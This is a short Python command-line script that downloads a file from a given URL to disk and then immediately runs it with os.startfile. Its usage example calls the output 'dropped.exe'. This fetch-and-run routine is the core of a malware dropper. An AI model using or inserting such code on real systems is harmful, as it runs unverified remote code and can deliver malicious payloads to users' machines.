import sys
import os
import urllib.request

# Responsible for downloading and writing data to disk
def	download(url, file):
	nstream = urllib.request.urlopen(url) # open network stream 
	
	# Delete existing file
	if os.path.exists(file) is True:
		print("File exists. Deleting")
		os.remove(file)
	
	fstream = open(file, "wb") # open file stream
	while True:
		raw = nstream.read(1024) # read 1024 bytes per block from our existing network stream
		if raw: # do this as long as the stream returns a anything 
			fstream.write(raw)  # write 1024 bytes to our local file
		else:
			break
	nstream.close() # close network stream 
	fstream.close() # close file stream


def execute(file):
	if os.path.exists(file) is True:
		os.startfile(file)


# main
args = sys.argv

if len(args) != 3:
	for x in args:
		print(x)

	print(len(args))
	help = """ Invalid params. Example:
  script.py <url> <dest>
  script.py https://www.host.com/file.exe dropped.exe"""
	print(help)
else:
	url = args[1] 
	file = args[2]

	if (len(url) > 0 and len(file) > 0):
		download(url, file)
		execute(file)

